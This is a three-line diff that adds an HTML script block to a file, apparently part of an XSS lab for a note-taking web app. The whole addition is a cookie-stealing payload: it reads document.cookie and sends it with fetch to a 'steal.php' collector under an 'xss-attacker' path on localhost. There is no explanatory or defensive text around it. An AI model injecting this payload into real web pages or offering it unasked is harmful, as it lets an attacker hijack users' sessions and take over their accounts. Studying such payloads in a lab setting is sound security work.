@@ -1,0 +1,3 @@
+<script>
+  fetch("http://localhost/cloud_based_note_app/xss/xss-attacker/steal.php?cookie=" + document.cookie)
+</script>
